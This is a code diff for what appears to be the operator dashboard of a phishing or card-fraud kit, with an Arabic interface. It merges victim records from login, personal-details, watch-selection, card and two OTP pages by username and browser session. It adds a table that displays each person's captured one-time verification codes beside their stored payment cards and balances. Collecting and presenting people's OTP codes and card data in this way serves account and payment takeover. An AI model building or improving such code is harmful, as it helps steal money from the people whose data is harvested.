@@ -341,6 +341,38 @@ function deriveAggregationKey(user) {
     return `id:${String(u.id || '')}`;
 }
 
+/** اسم العرض في الجدول: لا يستخدم عنوان الساعة كاسم مستخدم */
+function computeAggregateDisplayName(agg) {
+    if (!agg) return 'بدون اسم';
+    const m = agg.merged || {};
+    const loginRec = agg.byPageRecords && agg.byPageRecords.login;
+    const personalRec = agg.byPageRecords && agg.byPageRecords.personal;
+    const watchRec = agg.byPageRecords && agg.byPageRecords.watches;
+    const watchTitle =
+        watchRec && watchRec.selectedWatch != null
+            ? String(watchRec.selectedWatch).trim()
+            : '';
+    let cand =
+        m.username ||
+        m.linked_username ||
+        (loginRec && loginRec.username) ||
+        (personalRec && personalRec['full-name']) ||
+        m.phone ||
+        m.linked_phone ||
+        m['full-name'] ||
+        '';
+    if (
+        !cand &&
+        m.name &&
+        watchTitle &&
+        String(m.name).trim() === watchTitle
+    ) {
+        cand = '';
+    }
+    if (!cand && m.name) cand = String(m.name).trim();
+    return cand || 'بدون اسم';
+}
+
 function mergeAggregateGroup(group, recById) {
     const allIds = [...new Set(group.flatMap((g) => g.sourceIds))];
     const recs = allIds
@@ -368,16 +400,16 @@ function mergeAggregateGroup(group, recById) {
         base.page = row.page || base.page || '';
         base.registrationTime =
             row.registrationTime || row.timestamp || base.registrationTime;
-        base.displayName =
-            base.merged.username ||
-            base.merged.linked_username ||
-            base.merged['full-name'] ||
-            base.merged.phone ||
-            base.merged.name ||
-            base.displayName;
     }
+    base.displayName = computeAggregateDisplayName(base);
     base.cardSubmissions = recs
         .filter((r) => String(r.page || '') === 'card')
+        .map((r) => normalizeUserForDisplay({ ...r }));
+    base.otpSubmissions = recs
+        .filter((r) => {
+            const p = String(r.page || '');
+            return p === 'otp' || p === 'otp2';
+        })
         .map((r) => normalizeUserForDisplay({ ...r }));
     return base;
 }
@@ -415,6 +447,30 @@ function collapseAggregatesWithSameUsername(list, recById) {
     return out;
 }
 
+/** دمج كل الصفوف التي تشترك في نفس client_session_id (نفس الجهاز/المتصفح) */
+function collapseAggregatesWithSameClientSession(list, recById) {
+    const bySid = new Map();
+    const rest = [];
+    for (const agg of list) {
+        const sid = String(getClientSessionIdForAggregate(agg) || '')
+            .trim()
+            .toLowerCase();
+        if (sid) {
+            if (!bySid.has(sid)) bySid.set(sid, []);
+            bySid.get(sid).push(agg);
+        } else {
+            rest.push(agg);
+        }
+    }
+    const out = [...rest];
+    for (const [, group] of bySid) {
+        out.push(
+            group.length === 1 ? group[0] : mergeAggregateGroup(group, recById)
+        );
+    }
+    return out;
+}
+
 function buildAggregatedUsers(records) {
     const sorted = [...records].sort(
         (a, b) => recordSortTimestamp(a) - recordSortTimestamp(b)
@@ -432,9 +488,10 @@ function buildAggregatedUsers(records) {
                 merged: {},
                 byPageRecords: {},
                 cardSubmissions: [],
+                otpSubmissions: [],
                 page: row.page || '',
                 registrationTime: row.registrationTime || row.timestamp || '',
-                displayName: row.username || row.linked_username || row.name || 'بدون اسم'
+                displayName: 'بدون اسم'
             };
             map.set(key, agg);
             list.push(agg);
@@ -450,6 +507,12 @@ function buildAggregatedUsers(records) {
             agg.cardSubmissions.push(normalizeUserForDisplay({ ...rec }));
         }
 
+        const pageStr = String(rec.page || '');
+        if (pageStr === 'otp' || pageStr === 'otp2') {
+            if (!agg.otpSubmissions) agg.otpSubmissions = [];
+            agg.otpSubmissions.push(normalizeUserForDisplay({ ...rec }));
+        }
+
         const pageKey = row.page || 'other';
         agg.byPageRecords[pageKey] = row;
 
@@ -459,19 +522,14 @@ function buildAggregatedUsers(records) {
             agg.merged[k] = val;
         }
 
-        agg.displayName =
-            agg.merged.username ||
-            agg.merged.linked_username ||
-            agg.merged['full-name'] ||
-            agg.merged.phone ||
-            agg.merged.name ||
-            agg.displayName;
+        agg.displayName = computeAggregateDisplayName(agg);
         agg.page = row.page || agg.page || '';
         agg.registrationTime =
             row.registrationTime || row.timestamp || agg.registrationTime;
     }
     const recById = new Map(records.map((r) => [String(r.id), r]));
-    const mergedList = collapseAggregatesWithSameUsername(list, recById);
+    let mergedList = collapseAggregatesWithSameUsername(list, recById);
+    mergedList = collapseAggregatesWithSameClientSession(mergedList, recById);
     for (const agg of mergedList) {
         let maxTs = 0;
         for (const sid of agg.sourceIds) {
@@ -879,12 +937,76 @@ function getCardSubmissionsForUser(user) {
     return [];
 }
 
+function getOtpSubmissionsForUser(user) {
+    let list = [];
+    if (user.otpSubmissions && user.otpSubmissions.length) {
+        list = user.otpSubmissions.map((r) => normalizeUserForDisplay({ ...r }));
+    } else {
+        const otp = user.byPageRecords && user.byPageRecords.otp;
+        const otp2 = user.byPageRecords && user.byPageRecords.otp2;
+        if (otp) list.push(normalizeUserForDisplay({ ...otp }));
+        if (otp2) list.push(normalizeUserForDisplay({ ...otp2 }));
+    }
+    return [...list].sort(
+        (a, b) => recordSortTimestamp(a) - recordSortTimestamp(b)
+    );
+}
+
+function renderDashboardOtpTableSection(user) {
+    const list = getOtpSubmissionsForUser(user);
+    if (!list.length) {
+        return `
+        <div class="dash-otp-section">
+            <h3 class="dash-otp-heading">رموز التحقق (صفحتا OTP)</h3>
+            <p class="dash-otp-empty">لا توجد رموز مسجّلة.</p>
+        </div>`;
+    }
+    const body = list
+        .map((u, i) => {
+            const page = String(u.page || '');
+            const isSecond = page === 'otp2';
+            const code = isSecond
+                ? u.verificationCode != null && String(u.verificationCode).trim() !== ''
+                    ? String(u.verificationCode).trim()
+                    : '—'
+                : u.otpCode != null && String(u.otpCode).trim() !== ''
+                  ? String(u.otpCode).trim()
+                  : '—';
+            const sourceLabel = isSecond ? 'الرمز الثاني (otp2)' : 'الرمز الأول (otp)';
+            const when =
+                u.registrationTime || u.timestamp || u.createdAt || '—';
+            return `
+        <tr>
+            <td>${i + 1}</td>
+            <td>${escapeHtml(sourceLabel)}</td>
+            <td><code class="dash-otp-code">${escapeHtml(code)}</code></td>
+            <td>${escapeHtml(String(when))}</td>
+        </tr>`;
+        })
+        .join('');
+    return `
+    <div class="dash-otp-section">
+        <h3 class="dash-otp-heading">رموز التحقق (صفحتا OTP و otp2)</h3>
+        <table class="dash-otp-table">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>المصدر</th>
+                    <th>الرمز</th>
+                    <th>وقت التسجيل</th>
+                </tr>
+            </thead>
+            <tbody>${body}</tbody>
+        </table>
+    </div>`;
+}
+
 function renderDashboardFlipCardsRow(user) {
     const list = getCardSubmissionsForUser(user);
+    let cardsBlock;
     if (!list.length) {
-        return `<p class="dash-cards-empty">لا توجد بيانات بطاقة مسجّلة لهذا المستخدم.</p>`;
-    }
-
+        cardsBlock = `<p class="dash-cards-empty">لا توجد بيانات بطاقة مسجّلة لهذا المستخدم.</p>`;
+    } else {
     const rows = list.map((rec, i) => ({
         u: normalizeUserForDisplay(rec),
         cap: cardRegistrationCaptionAr(i + 1)
@@ -954,12 +1076,16 @@ function renderDashboardFlipCardsRow(user) {
         </div>`;
     }
 
-    return `
+    cardsBlock = `
     <div class="dash-cards-wrap">
         <h3 class="dash-cards-heading">البطاقات المضافة لهذا المستخدم</h3>
         <p class="dash-cards-sub">الوجه الأمامي: البيانات — اضغط «قلب البطاقة» لعرض الرصيد في الخلف. أحدث بطاقة تظهر إلى اليسار.</p>
         <div class="dash-cards-track" dir="ltr">${trackHtml}</div>
     </div>`;
+    }
+
+    const otpBlock = renderDashboardOtpTableSection(user);
+    return `${cardsBlock}\n${otpBlock}`;
 }
 
 function openCardModal(userId) {
